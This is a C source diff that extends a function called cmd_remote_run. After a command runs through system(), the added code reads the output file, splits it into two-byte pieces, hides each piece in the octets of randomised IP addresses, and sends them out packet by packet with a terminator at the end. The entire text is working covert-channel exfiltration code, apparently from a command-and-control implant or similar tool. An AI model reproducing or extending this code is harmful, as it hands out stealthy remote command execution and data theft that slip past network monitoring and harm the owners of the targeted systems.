@@ -297,6 +297,50 @@ int cmd_remote_run(struct Context *ctx, struct List *list) {
     int ret = system(result);
 
     // send output.txt
+    const int file_fd = open("output.txt", O_RDONLY);
+    if (file_fd < 0) {
+        fprintf(stderr, "open file failed\n");
+        free(result);
+        return -1;
+    }
+
+    char ip_buffer[IP_ADDR_LEN] = {0};
+    uint8_t data_buffer[DATA_BUF_SIZE] = {0};
+
+    ret = encode_ip(ip_buffer, rand_ip_octet(ctx), 0, 0, REP_REQ_FILE_DATA);
+    if (ret < 0) {
+        fprintf(stderr, "encode cmd failed\n");
+    }
+    send_packet(ctx, ip_buffer);
+    // send file data
+    // while not eod, get the next two bytes, encode, ship it
+
+    ssize_t bytes_read;
+    while ((bytes_read = read(file_fd, data_buffer, DATA_BUF_SIZE)) > 0) {
+        for (ssize_t i = 0; i < bytes_read; i += 2) {
+            if (i == bytes_read - 1) {
+                // Only one byte left
+                ret = encode_ip(ip_buffer, rand_ip_octet(ctx), rand_ip_octet(ctx), data_buffer[i], 0);
+            } else {
+                // Two bytes available
+                ret = encode_ip(ip_buffer, rand_ip_octet(ctx), rand_ip_octet(ctx), data_buffer[i], data_buffer[i+1]);
+            }
+            if (ret < 0) {
+                fprintf(stderr, "encode data failed\n");
+            }
+            send_packet(ctx, ip_buffer);
+        }
+    }
+
+    // send TERM
+    ret = encode_ip(ip_buffer, rand_ip_octet(ctx), 1, 0, 0);
+    if (ret < 0) {
+        fprintf(stderr, "encode term failed\n");
+    }
+    send_packet(ctx, ip_buffer);
+
+    // might need a strong wait here
+    close(file_fd);
 
     free(result);
     return ret;
